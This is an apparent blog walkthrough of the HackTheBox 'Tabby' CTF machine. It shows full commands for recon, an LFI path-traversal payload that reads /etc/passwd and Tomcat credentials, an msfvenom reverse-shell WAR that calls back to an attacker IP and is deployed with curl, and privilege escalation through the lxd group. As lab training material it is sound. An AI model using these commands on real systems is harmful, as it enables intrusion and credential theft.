<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.5.1"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="HackTheBox - Tabby" /><meta property="og:locale" content="en_US" /><meta name="description" content="Welcome to my blog of CTF walkthroughs and anything else I post regarding cyber security." /><meta property="og:description" content="Welcome to my blog of CTF walkthroughs and anything else I post regarding cyber security." /><link rel="canonical" href="https://freddiphish.github.io/posts/HTB-Tabby/" /><meta property="og:url" content="https://freddiphish.github.io/posts/HTB-Tabby/" /><meta property="og:site_name" content="FreddiPhish" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-11-08T23:30:00+11:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="HackTheBox - Tabby" /><meta name="twitter:site" content="@FreddiPhish" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"description":"Welcome to my blog of CTF walkthroughs and anything else I post regarding cyber security.","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://freddiphish.github.io/posts/HTB-Tabby/"},"url":"https://freddiphish.github.io/posts/HTB-Tabby/","headline":"HackTheBox - Tabby","dateModified":"2020-11-08T23:30:00+11:00","datePublished":"2020-11-08T23:30:00+11:00","@context":"https://schema.org"}</script><title>HackTheBox - Tabby | FreddiPhish</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/favicons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">FreddiPhish</a></div><div class="site-subtitle font-italic">Cybersecurity Blog</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <span id="mode-toggle-wrapper"> <i class="mode-toggle fas fa-sun" dark-mode-invisible></i> <i class="mode-toggle fas fa-moon" light-mode-invisible></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.mode != null) { if (this.mode == ModeToggle.DARK_MODE) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.mode != null) { if (self.mode == ModeToggle.DARK_MODE) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span> <span class="icon-border"></span> <a href="https://github.com/FreddiPhish" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/FreddiPhish" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>HackTheBox - Tabby</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>HackTheBox - Tabby</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 8, 2020, 11:30 PM +1100" > Nov 8, 2020 <i class="unloaded">2020-11-08T23:30:00+11:00</i> </span> by <span class="author"> </span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/info-card.png" alt="Image of info card" /></p><h2 id="enumeration">Enumeration</h2><hr /><h3 id="initial-information">Initial Information</h3><p>Before starting we are shown this this is a linux box and that they rate it as an easy box.</p><h3 id="editing-hosts">Editing Hosts</h3><p>Lets add assign the ip address a domain name in our hosts file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>sudo vim /etc/hosts
[ip] tabby.htb
</pre></table></code></div></div><h3 id="nmap-scan">Nmap Scan:</h3><p>Lets run <a href="https://nmap.org/">nmap</a> to find information on the machine’s ports and services.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo nmap -A -T4 -Pn -oN nmap-scan -p$(sudo nmap -p- --min-rate=1000 -T4 tabby.htb | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) tabby.htb
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/nmap-scan.png" alt="Image of nmap scan" /></p><p>The results of nmap show that ports 22 (ssh), 80 (http) and 8080 (http) are open.</p><h3 id="browsing">Browsing</h3><p>Viewing the website on port 80:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/browser-home.png" alt="Image of website homepage" /></p><p>There is hyperlinked text at the bottom where it says “Read our statement on recoverying from the data breach”. The link points to <code class="language-plaintext highlighter-rouge">http://megahosting.htb/news.php?file=statement</code> so we either need to manually replace the <code class="language-plaintext highlighter-rouge">megahosting</code> to <code class="language-plaintext highlighter-rouge">tabby</code> or the add <code class="language-plaintext highlighter-rouge">megahosting</code> to the hosts file. I’ll be opting for the later.</p><p>Now we can view the megahosting page:</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/browser-megahost.png" alt="Image of megahosting webpage" /></p><p>According to the content on the page, it sounds like there was a tool on the website that led to a databreach.</p><p>Nmap also showed that there was a Apache Tomacat http site on port 8080. Looking at port 8080 reveals a Tomcat default page.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/browser-tomcat.png" alt="Image of tomcat homepage" /></p><h3 id="gobuster">Gobuster</h3><p>Lets do some directory brute forcing of the main website on port 80.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo gobuster dir -u http://megahosting.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -s '200,204,301,302,307,403,500' -o gobuster.out -e
</pre></table></code></div></div><p>where:</p><ul><li><strong>-u</strong> is the target URL<li><strong>-w</strong> is the path to the wordlist<li><strong>-t</strong> is the number of concurrent threads (default 10)<li><strong>-s</strong> is positive status codes (will be overwritten with status-codes-blacklist if set) (default “200,204,301,302,307,401,403”)<li><strong>-o</strong> is the output file to write results to (defaults to stdout)<li><strong>-e</strong> is expanded mode, print full URLs</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/gobuster-port-80.png" alt="Image of gobuster port 80 results" /></p><p>Nothing in particular stands out, however we didn’t search for any specific file extations, but we can do more in depth scanning later if need be.</p><p>Let’s also scan the apache tomcat page on port 8080:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>sudo gobuster dir -u http://megahosting.htb:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 100 -s '200,204,301,302,307,403,500' -o gobuster_8080.out -e
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/gobuster-port-8080.png" alt="Image of gobuster port 8080 results" /></p><p>We find what looks like the default directories for tomcat, which makes sense seeing as thoughwe where greeted by the default post installation page.</p><p>Navigating to the /manager page, we are required to log in. While we could try using a list of <a href="https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown">default credentials</a> I want to first look back to the megahosting url.</p><h2 id="exploitation">Exploitation</h2><hr /><h3 id="testing-for-lfi-local-file-inclusion">Testing for LFI (Local File Inclusion)</h3><p>At the megahosting page we found <code class="language-plaintext highlighter-rouge">http://megahosting.htb/news.php?file=statement</code> we can test for LFI (Local File Inclusion) by replacing the word <code class="language-plaintext highlighter-rouge">statement</code> at the end with a directory traversal to a file we know exists, such as passwd.</p><p>Trying <code class="language-plaintext highlighter-rouge">http://megahosting.htb/news.php?file=../../../../../../etc/passwd</code> works however the contents are a mess, so we can clean it up by viewing the pages source code.</p><p><code class="language-plaintext highlighter-rouge">view-source:http://megahosting.htb/news.php?file=../../../../../../etc/passwd</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/lfi-passwd-source.png" alt="Image of LFI" /></p><h3 id="testing-for-rfi-remote-file-inclusion">Testing for RFI (Remote File Inclusion)</h3><p>Just in case we can also test for RFI (Remote FIle Inclusion) by creating a phpinfo() file, hosting it and trying to load it by replacing the <code class="language-plaintext highlighter-rouge">statement</code> in the url with the url path to the file.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>echo '&lt;?php phpinfo(); ?&gt;' &gt; info.php
python -m SimpleHTTPServer 80
http://megahosting.htb/news.php?file=http://10.10.14.142/info.php
</pre></table></code></div></div><p>Unfortunately it doesn’t work.</p><h3 id="lfi-enumeration">LFI Enumeration</h3><p>When we looked at port 8080, we saw it mention about users stored in <code class="language-plaintext highlighter-rouge">/etc/tomcat9/tomcat-users.xml</code>. Looking there using the LFI exploit, we dont see anything so it’s likely that it’s installed elsewhere.</p><p>We know the operating system is linux, with the distro likely being Ubuntu as that’s what nmap found based off of the OpenSSH verion. So searching online for the installation directories for Ubuntu Tomcat led me <a href="https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory">here</a>. After looking at a few directories I found the installation path to be <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9</code> with the tomcat-users.xml file being in <code class="language-plaintext highlighter-rouge">/usr/share/tomcat9/etc/tomcat-users.xml</code>.</p><p>Now that we know where the file is, we can use the LFI vulnerability to view it’s contents. As usual with viewing LFI output, we can view the source to have a cleaner output.</p><p><code class="language-plaintext highlighter-rouge">view-source:http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/tomcat-users.png" alt="Image of Tomcat users" /></p><p>Located at the bottom of the page are what should be the tomcat username: <code class="language-plaintext highlighter-rouge">tomcat</code> and password: <code class="language-plaintext highlighter-rouge">$3cureP4s5w0rd123!</code></p><h3 id="accessing-tomcat">Accessing Tomcat</h3><p>Now that we have the tomcat credentials, we can attempt to log into the Tomcat Manager. Unfortunately, trying to log into Tomcat at <code class="language-plaintext highlighter-rouge">http://megahosting.htb:8080/manager</code>gives us a 403 Access Denied, which means the password should be working, we just aren’t allowed to view the page.</p><p>The way we can often exploit Tomcat is by uploading a malicous .war file and running it to get a reverse shell. Since we know we should have valid credentials but just cant access the site, we can try to upload the .war file from the terminal, bypassing the restricted page.</p><p>We can try to use curl to list the current list of applications in Tomcat.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl -u "tomcat:\$3cureP4s5w0rd123!" http://megahosting.htb:8080/manager/text/list
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/curl-tomcat-list.png" alt="Image of curl tomcat" /></p><p>It’s a success! Since we now know we can access the tomcat manager, lets create the .war payload.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.52 LPORT=4444 -f war -o revshell.war
</pre></table></code></div></div><p>Now we can upload the .war file to the tomcat manager.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl -v -u 'tomcat:$3cureP4s5w0rd123!' -T shell.war 'http://megahosting.htb:8080/manager/text/deploy?path=/shell'
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/curl-tomcat-upload.png" alt="Image of curl tomcat" /></p><p>Lets double check if it’s there.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl -u "tomcat:\$3cureP4s5w0rd123!" http://megahosting.htb:8080/manager/text/list
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/images/htb/tabby/curl-tomcat-list2.png" alt="Image of curl tomcat" /></p><p>We can see that <code class="language-plaintext highlighter-rouge">/shell:running:0:shell</code> has been added, which should be our .war payload. Since it looks like it’s been uploaded, we can try to get a reverse shell. Let’s set up a listener with <code class="language-plaintext highlighter-rouge">nc -nlvp 4444</code> and we use curl to start the shell:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl -u "tomcat:\$3cureP4s5w0rd123!" http://megahosting.htb:8080/shell/
</pre></table></code></div></div><p>And we are in! We recieve a reverse shell as the service user tomcat.</p><p>And before we do any post enumeration, lets quickly upgrade to a pty shell:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>python3 -c 'import pty; pty.spawn("/bin/bash")'
</pre></table></code></div></div><h2 id="lateral-movement">Lateral Movement</h2><hr /><h3 id="post-enumeration">Post Enumeration</h3><p>Looking in the /home directory, there is a user called ash, whose folder we can’t access.</p><p>As part of our post enumeration we can look for files that ash owns.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>find / -type f -user ash 2&gt;/dev/null
</pre></table></code></div></div><p>We find a backup.zip file at: <code class="language-plaintext highlighter-rouge">/var/www/html/files/16162020_backup.zip</code></p><p>Sicne it’s in the website folder, we can simply download it through our browser:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>http://megahosting.htb/files/16162020_backup.zip
</pre></table></code></div></div><h3 id="password-cracking">Password Cracking</h3><p>The file is password protected, we can try to crack the password with john:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>zip2john backup.zip &gt; tabby-hash
john tabby-hash --fork=4 -w=/usr/share/wordlists/rockyou.txt
</pre></table></code></div></div><p>We get the password as <code class="language-plaintext highlighter-rouge">admin@it</code> however there’s nothing of interest in the zip file, so let’s try to use the password for the user <code class="language-plaintext highlighter-rouge">ash</code> since the file bleonged to her.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>su ash
admin@it
</pre></table></code></div></div><p>And we are successfully able to switch to user ash. Let’s get the user flag.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cd ~
cat user.txt
</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation</h2><hr /><p>Looking at our groups as user ash:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>id
uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
</pre></table></code></div></div><p>We can see the group <code class="language-plaintext highlighter-rouge">lxd</code> which looks interesting as my understanding of lxd is that it’s similar to docker containers, so my first thought is perhaps we can mount it and have root access inside similar to privledge escalation methods with docker.</p><p>Reading up more about it here: <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a> it seems my guess was right, so i just followed the steps listed there in method 2, with some minor changes.</p><p>Following the guide, we first need to build the alpine image</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>git clone https://github.com/saghul/lxd-alpine-builder
./build-alpine -a i686
</pre></table></code></div></div><p>Then we transfer the alpine file we built to tabby, we can just host a server with <code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 80</code> then use <code class="language-plaintext highlighter-rouge">wget</code> to download it. Then we follow the instructions to import the image, initialize it and run it where we will be root and access tabby’s files which have been mounted.</p><p>Use lxc to import our alpine image:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lxc image import ./alpine-v3.12-x86_64-20201012_1656.tar.gz --alias myimage
</pre></table></code></div></div><p>We can then double check that the image was imported with:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lxc image list
</pre></table></code></div></div><p>For the next step which is running the image, I recieved an error stating that no storage pool found. I managed to fix this by first running <code class="language-plaintext highlighter-rouge">lxc init</code> (found this here: <a href="https://techoverflow.net/2018/05/03/how-to-fix-lxd-failed-container-creation-no-storage-pool-found-please-create-a-new-storage-pool/">https://techoverflow.net/2018/05/03/how-to-fix-lxd-failed-container-creation-no-storage-pool-found-please-create-a-new-storage-pool/</a>) then accepting all the defaults. Afterwards running the listed <code class="language-plaintext highlighter-rouge">init</code> command from the guide worked.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>lxc init
lxc init myimage mycontainer -c security.privileged=true
</pre></table></code></div></div><p>Now we can mount it the local file share to /mnt/root so we can access the local file share in the lxc container:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
</pre></table></code></div></div><p>Now with the container all set up, we can run it and start a shell:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>lxc start mycontainer
lxc exec mycontainer /bin/sh
</pre></table></code></div></div><p>Now we can navigate to the mounted share and get the root flag.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>cd /mnt/root/root
cat root.txt
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf/'>CTF</a>, <a href='/categories/htb/'>HTB</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox - Tabby - FreddiPhish&url=https://freddiphish.github.io/posts/HTB-Tabby/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox - Tabby - FreddiPhish&u=https://freddiphish.github.io/posts/HTB-Tabby/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox - Tabby - FreddiPhish&url=https://freddiphish.github.io/posts/HTB-Tabby/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTB-Omni/">HackTheBox - Omni</a><li><a href="/posts/HTB-Buff/">HackTheBox - Buff</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">ctf</a> <a class="post-tag" href="/tags/htb/">htb</a> <a class="post-tag" href="/tags/openbsd/">openbsd</a> <a class="post-tag" href="/tags/port-fowarding/">port fowarding</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/windows-iot/">windows iot</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> 